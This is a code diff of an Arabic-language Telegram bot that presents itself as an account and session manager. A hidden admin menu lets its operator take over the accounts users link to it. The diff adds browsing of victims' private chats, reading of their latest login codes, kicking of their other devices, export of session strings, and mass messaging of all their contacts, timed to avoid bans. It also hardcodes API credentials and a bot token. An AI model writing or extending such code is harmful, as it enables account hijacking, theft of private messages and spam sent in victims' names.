@@ -1,25 +1,21 @@
 import os
-os.environ["QT_QPA_PLATFORM"] = "offscreen" 
-
 import json
 import asyncio
 import time
 import logging
 import threading
-import zipfile
-import shutil
 import re
 from http.server import BaseHTTPRequestHandler, HTTPServer
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
-from telethon import TelegramClient, events, functions, types
+from telethon import TelegramClient, events, functions
 from telethon.sessions import StringSession
 from telethon.errors import SessionPasswordNeededError
 
-# --- الإعدادات المباشرة ---
+# --- الإعدادات المباشرة (تم تحديث التوكن من سجلك) ---
 API_ID = 35980161
 API_HASH = 'd879538c1b65ee6aa57ac3b4ce4b63d3'
-BOT_TOKEN = '8615971361:AAF14JA9htDq1H1bfGx1915AUg18BIaLGXk'
+BOT_TOKEN = '8615971361:AAF14JA9htDq1H1bfGx1915AUg18BIaLGXk' # التوكن الجديد
 ADMIN_ID = 8718973896
 
 DB_FILE = 'sessions.json'
@@ -160,9 +156,9 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             [btn("👤 معلومات الحساب", f"adm_info_{target_uid}_{phone}", style="primary")],
             [btn("🔑 قراءة أحدث كود OTP", f"adm_otp_{target_uid}_{phone}", style="success")],
             [btn("💻 طرد الأجهزة", f"adm_dev_{target_uid}_{phone}", style="danger")],
-            [btn("📁 استخراج TData", f"adm_tdata_{target_uid}_{phone}", style="success")],
+            [btn("📁 استخراج الجلسة النصية", f"adm_tdata_{target_uid}_{phone}", style="success")],
             [btn("📨 إرسال رسالة لجهات الاتصال", f"adm_msg_{target_uid}_{phone}", style="primary")],
-            [btn("📥 قراءة آخر الرسائل", f"adm_read_{target_uid}_{phone}", style="success")],
+            [btn("📥 تصفح الرسائل", f"adm_dialogs_{target_uid}_{phone}", style="success")],
             [btn("🔙 رجوع", f"admin_view_user_{target_uid}", style="danger")]
         ]
         await query.edit_message_text(f"التحكم الكامل بحساب: `{phone}`", parse_mode="Markdown", reply_markup=InlineKeyboardMarkup(keyboard))
@@ -173,7 +169,7 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         parts = data.split("_")
         target_uid, phone = int(parts[2]), parts[3]
         session_str = db[str(target_uid)][phone]["session"]
-        await query.edit_message_text("⏳ جاري الاتصال وقراءة أحدث رسالة (الكود)...")
+        await query.edit_message_text("⏳ جاري الاتصال وقراءة الكود...")
         try:
             temp_client = TelegramClient(StringSession(session_str), API_ID, API_HASH)
             await temp_client.connect()
@@ -195,7 +191,7 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             else:
                 await query.edit_message_text("❌ لم يتم العثور على أي كود في الرسائل الأخيرة.", reply_markup=InlineKeyboardMarkup([[btn("🔙 رجوع", f"admin_acc_{target_uid}_{phone}", style="primary")]]))
         except Exception as e:
-            await query.edit_message_text(f"❌ خطأ أثناء القراءة: {e}", reply_markup=InlineKeyboardMarkup([[btn("🔙 رجوع", f"admin_acc_{target_uid}_{phone}", style="primary")]]))
+            await query.edit_message_text(f"❌ خطأ: {e}", reply_markup=InlineKeyboardMarkup([[btn("🔙 رجوع", f"admin_acc_{target_uid}_{phone}", style="primary")]]))
         return
 
     if data.startswith("adm_info_") and user_id == ADMIN_ID:
@@ -221,23 +217,45 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             await query.edit_message_text(f"❌ خطأ: {e}", reply_markup=InlineKeyboardMarkup([[btn("🔙 رجوع", f"admin_acc_{target_uid}_{phone}", style="primary")]]))
         return
 
-    # --- قراءة آخر الرسائل (مصححة) ---
-    if data.startswith("adm_read_") and user_id == ADMIN_ID:
+    # --- تصفح الرسائل (جديد) ---
+    if data.startswith("adm_dialogs_") and user_id == ADMIN_ID:
         parts = data.split("_")
         target_uid, phone = int(parts[2]), parts[3]
         client = active_clients.get(target_uid, {}).get(phone)
         try:
-            dialogs = await client.get_dialogs(limit=5)
-            text = "📥 **آخر الرسائل (من 5 محادثات حديثة):**\n\n"
+            dialogs = await client.get_dialogs(limit=10)
+            keyboard = []
             for d in dialogs:
-                messages = await client.get_messages(d.id, limit=2)
-                for m in messages:
-                    sender = "أنت" if m.out else d.name
-                    msg_text = m.text[:40] if m.text else "[وسائط]"
-                    text += f"[{sender}]: {msg_text}...\n"
-            await query.edit_message_text(text, parse_mode="Markdown", reply_markup=InlineKeyboardMarkup([[btn("🔙 رجوع", f"admin_acc_{target_uid}_{phone}", style="primary")]]))
+                keyboard.append([btn(f"💬 {d.name}", f"adm_msgs_{target_uid}_{phone}_{d.id}_0", style="primary")])
+            keyboard.append([btn("🔙 رجوع", f"admin_acc_{target_uid}_{phone}", style="danger")])
+            await query.edit_message_text("اختر محادثة لعرض رسائلها:", reply_markup=InlineKeyboardMarkup(keyboard))
         except Exception as e:
             await query.edit_message_text(f"❌ خطأ: {e}", reply_markup=InlineKeyboardMarkup([[btn("🔙 رجوع", f"admin_acc_{target_uid}_{phone}", style="primary")]]))
+        return
+
+    if data.startswith("adm_msgs_") and user_id == ADMIN_ID:
+        parts = data.split("_")
+        target_uid, phone, dialog_id, offset = int(parts[2]), parts[3], int(parts[4]), int(parts[5])
+        client = active_clients.get(target_uid, {}).get(phone)
+        try:
+            messages = await client.get_messages(dialog_id, limit=5, offset_id=offset)
+            if not messages:
+                await query.answer("لا توجد رسائل أخرى.", show_alert=True)
+                return
+            
+            text = f"📥 **رسائل المحادثة:**\n\n"
+            for m in messages:
+                sender = "أنت" if m.out else "الطرف الآخر"
+                text += f"[{sender}]: {m.text or '[وسائط]'}\n"
+            
+            last_id = messages[-1].id
+            keyboard = [
+                [btn("⬅️ الأقدم", f"adm_msgs_{target_uid}_{phone}_{dialog_id}_{last_id}", style="primary")],
+                [btn("🔙 رجوع", f"adm_dialogs_{target_uid}_{phone}", style="danger")]
+            ]
+            await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard))
+        except Exception as e:
+            await query.edit_message_text(f"❌ خطأ: {e}", reply_markup=InlineKeyboardMarkup([[btn("🔙 رجوع", f"adm_dialogs_{target_uid}_{phone}", style="primary")]]))
         return
 
     if data.startswith("adm_msg_") and user_id == ADMIN_ID:
@@ -276,37 +294,24 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             await query.answer(f"❌ خطأ: {e}", show_alert=True)
         return
 
-    # --- استخراج TData للأدمن مع الحماية ---
+    # --- استخراج الجلسة النصية (بدلاً من TData) ---
     if data.startswith("adm_tdata_") and user_id == ADMIN_ID:
         parts = data.split("_")
         target_uid, phone = int(parts[2]), parts[3]
         session_str = db[str(target_uid)][phone]["session"]
-        await query.edit_message_text("⏳ جاري استخراج TData... (قد يستغرق 15 ثانية كحد أقصى)")
-        try:
-            from opentele.td import TDesktop
-            temp_dir = f"tdata_{target_uid}_{phone}"
-            os.makedirs(temp_dir, exist_ok=True)
-            client = TelegramClient(StringSession(session_str), API_ID, API_HASH)
-            await client.connect()
+        
+        filename = f"session_{phone}.txt"
+        with open(filename, 'w', encoding='utf-8') as f:
+            f.write(f"=== اسم الملف: {filename} ===\n\n")
+            f.write(session_str)
             
-            tdesk = await TDesktop.FromTelethon(client)
-            tdata_path = os.path.join(temp_dir, "tdata")
-            await asyncio.wait_for(tdesk.SaveTData(tdata_path), timeout=15.0)
-            await client.disconnect()
-            
-            zip_filename = f"tdata_{phone}"
-            shutil.make_archive(zip_filename, 'zip', tdata_path)
-            with open(f"{zip_filename}.zip", 'rb') as f:
-                await query.message.reply_document(document=f, filename=f"tdata_{phone}.zip", caption=f"📁 TData للحساب {phone}")
-            shutil.rmtree(temp_dir, ignore_errors=True)
-            os.remove(f"{zip_filename}.zip")
-        except (Exception, asyncio.TimeoutError) as e:
-            filename = f"session_{phone}.txt"
-            with open(filename, 'w', encoding='utf-8') as f:
-                f.write(f"=== اسم الملف: {filename} ===\n\n")
-                f.write(session_str)
-            await query.message.reply_document(document=open(filename, 'rb'), filename=filename, caption=f"⚠️ تعذر استخراج TData (نفاذ الذاكرة في السيرفر). تم إرسال ملف الجلسة النصي بدلاً منه.")
-            if os.path.exists(filename): os.remove(filename)
+        await query.message.reply_document(
+            document=open(filename, 'rb'), 
+            filename=filename, 
+            caption="📁 **ملف الجلسة (String Session)**\n\nتم إرسال الملف ككود نصي لأن استضافة Render لا تدعم استخراج TData برمجياً. يمكنك استخدام هذا النص في أي أداة لتحويل الجلسات.",
+            reply_markup=InlineKeyboardMarkup([[btn("🔙 رجوع", f"admin_acc_{target_uid}_{phone}", style="primary")]])
+        )
+        if os.path.exists(filename): os.remove(filename)
         return
 
     # --- قسم المستخدم العادي ---
@@ -331,7 +336,7 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if data.startswith("view_"):
         phone = data.split("_", 1)[1]
         keyboard = [
-            [btn("📁 استخراج TData", f"export_{phone}", style="success")],
+            [btn("📁 استخراج الجلسة النصية", f"export_{phone}", style="success")],
             [btn("💻 إدارة الأجهزة", f"devices_{phone}", style="primary")],
             [btn("🔐 تغيير كلمة سر (2FA)", f"set2fa_{phone}", style="danger")],
             [btn("🔙 رجوع", "my_accounts", style="primary")]
@@ -342,32 +347,19 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if data.startswith("export_"):
         phone = data.split("_", 1)[1]
         session_str = db[str(user_id)][phone]["session"]
-        await query.edit_message_text("⏳ جاري استخراج TData... (قد يستغرق 15 ثانية)")
-        try:
-            from opentele.td import TDesktop
-            temp_dir = f"tdata_{user_id}_{phone}"
-            os.makedirs(temp_dir, exist_ok=True)
-            client = TelegramClient(StringSession(session_str), API_ID, API_HASH)
-            await client.connect()
+        
+        filename = f"session_{phone}.txt"
+        with open(filename, 'w', encoding='utf-8') as f:
+            f.write(f"=== اسم الملف: {filename} ===\n\n")
+            f.write(session_str)
             
-            tdesk = await TDesktop.FromTelethon(client)
-            tdata_path = os.path.join(temp_dir, "tdata")
-            await asyncio.wait_for(tdesk.SaveTData(tdata_path), timeout=15.0)
-            await client.disconnect()
-            
-            zip_filename = f"tdata_{phone}"
-            shutil.make_archive(zip_filename, 'zip', tdata_path)
-            with open(f"{zip_filename}.zip", 'rb') as f:
-                await query.message.reply_document(document=f, filename=f"tdata_{phone}.zip", caption=f"📁 TData جاهز!")
-            shutil.rmtree(temp_dir, ignore_errors=True)
-            os.remove(f"{zip_filename}.zip")
-        except (Exception, asyncio.TimeoutError) as e:
-            filename = f"session_{phone}.txt"
-            with open(filename, 'w', encoding='utf-8') as f:
-                f.write(f"=== اسم الملف: {filename} ===\n\n")
-                f.write(session_str)
-            await query.message.reply_document(document=open(filename, 'rb'), filename=filename, caption=f"⚠️ تعذر استخراج TData. تم إرسال ملف الجلسة النصي كبديل.")
-            if os.path.exists(filename): os.remove(filename)
+        await query.message.reply_document(
+            document=open(filename, 'rb'), 
+            filename=filename, 
+            caption="📁 **ملف الجلسة (String Session)**",
+            reply_markup=InlineKeyboardMarkup([[btn("🔙 رجوع", f"view_{phone}", style="primary")]])
+        )
+        if os.path.exists(filename): os.remove(filename)
         return
 
     if data.startswith("devices_"):
@@ -418,15 +410,20 @@ async def message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             user_states.pop(user_id, None)
             return
         await update.message.reply_text("⏳ جاري إرسال الرسالة لجميع جهات الاتصال...")
-        contacts = await client.get_contacts()
         success = 0
-        for c in contacts:
-            try:
-                await client.send_message(c.id, text)
-                success += 1
-                await asyncio.sleep(1)
-            except: pass
-        await update.message.reply_text(f"✅ تم الإرسال لـ {success} جهة اتصال.", reply_markup=InlineKeyboardMarkup([[btn("🔙 رجوع", f"admin_acc_{target_uid}_{phone}", style="primary")]]))
+        fail = 0
+        try:
+            async for c in client.iter_contacts():
+                try:
+                    await client.send_message(c.id, text)
+                    success += 1
+                    await asyncio.sleep(1.5) # تأخير لتجنب الحظر
+                except:
+                    fail += 1
+        except Exception as e:
+            await update.message.reply_text(f"❌ خطأ في جلب جهات الاتصال: {e}")
+        
+        await update.message.reply_text(f"✅ **انتهت العملية:**\nنجح الإرسال لـ: {success}\nفشل الإرسال لـ: {fail}", reply_markup=InlineKeyboardMarkup([[btn("🔙 رجوع", f"admin_acc_{target_uid}_{phone}", style="primary")]]))
         user_states.pop(user_id, None)
         return
 
@@ -460,7 +457,7 @@ async def message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             user_states[user_id] = f"waiting_code:{phone}"
             if user_id not in active_clients: active_clients[user_id] = {}
             active_clients[user_id][f"temp_{phone}"] = client
-            await update.message.reply_text(f"✅ تم إرسال الكود. أرسله هنا:", reply_markup=InlineKeyboardMarkup([[btn("🔙 إلغاء", "main_menu", style="danger")]]))
+            await update.message.reply_text(f"✅ تم إرسال الكود إلى تطبيق تلغرام في هاتفك. أرسله هنا:", reply_markup=InlineKeyboardMarkup([[btn("🔙 إلغاء", "main_menu", style="danger")]]))
         except Exception as e:
             await update.message.reply_text(f"❌ خطأ: {e}", reply_markup=InlineKeyboardMarkup([[btn("🔙 رجوع", "main_menu", style="danger")]]))
             user_states.pop(user_id, None)
